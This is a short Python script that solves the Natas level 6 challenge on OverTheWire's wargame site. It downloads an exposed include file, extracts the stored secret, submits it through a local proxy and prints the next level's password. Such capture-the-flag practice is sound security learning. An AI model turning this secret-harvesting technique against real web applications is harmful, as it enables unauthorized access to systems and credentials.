#!/usr/bin/python3

import requests
import re
import os


username = 'natas6'
password=os.getenv("natas_pass")

proxies={'http':'http://127.0.0.1:8080'}

url = "http://{0}.natas.labs.overthewire.org/".format(username)

url1=url + "includes/secret.inc"

url2 = url + "index-source.html"
response1 = requests.get(url1,auth=(username,password))
response2 = requests.get(url2,auth=(username,password))

# print(response1.text)
# print(response2.text)


secret = re.findall('secret = "(.*)"',response1.text)[0]

body={'secret':secret,'submit':'Submit Query'}

response2 =  requests.post(url,auth=(username,password),data=body,proxies=proxies)

flag=re.findall("natas7 is (.*)",response2.text)[0]

print(flag)